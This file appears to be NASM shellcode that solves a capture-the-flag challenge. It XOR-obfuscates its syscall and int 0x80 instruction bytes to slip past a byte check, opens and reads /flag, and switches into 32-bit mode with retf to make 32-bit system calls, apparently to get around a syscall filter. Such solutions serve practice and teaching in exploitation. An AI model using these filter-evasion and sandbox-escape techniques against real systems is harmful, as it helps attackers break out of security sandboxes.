
global _code64

flag_addr equ 0x1337331337
buf_addr equ 0x1337000

section .text64 progbits alloc exec write align=16
BITS 64
_code64:
    ; obfuscate syscall; ret bytes to pass check
    mov ax, 0x444e
    xor ax, 0x4141
    ; force nasm to use absolute addressing
    ; NASM, in 64-bit mode, typically uses RIP-relative addressing for labels, which relies on a 32-bit displacement from the instruction pointer (RIP)
    mov rdx, _sys64
    mov [rdx], ax

    ; obfuscate int 0x80; ret bytes to pass check
    mov ax, 0xc18c
    xor ax, 0x4141
    mov rdx, _sys32
    mov [rdx], ax

    mov rax, '/flag'
    mov rdx, flag_addr
    mov qword [rdx], rax

    mov rdi, flag_addr
    xor rsi, rsi
    mov rax, 0x2
    call _sys64

    ; retf: first eip, then segment descriptor
    mov rax, _code32
    push rax
    mov dword [rsp + 4], 0x23

    retf

_loop64:
    jmp _loop64

_sys64:
    dw 0x4141
    ret

section .text32 progbits alloc exec write align=16
BITS 32
_code32:
    lea esp, _stack_end

    mov ebx, 0x3
    mov ecx, buf_addr
    mov edx, 0x40
    mov eax, 0x3
    call _sys32

    mov ebx, 0x1
    mov eax, 4
    call _sys32

    mov ebx, 137
    mov eax, 1
    call _sys32

_loop32:
    jmp _loop32

_sys32:
    dw 0x4141
    ret

_stack:
    times 128 nop
_stack_end:

section .data_code64 progbits alloc write
    placeholder_64: times 100 db 0x0

section .data_code32 progbits alloc write
    placeholder_32: times 100 db 0x0
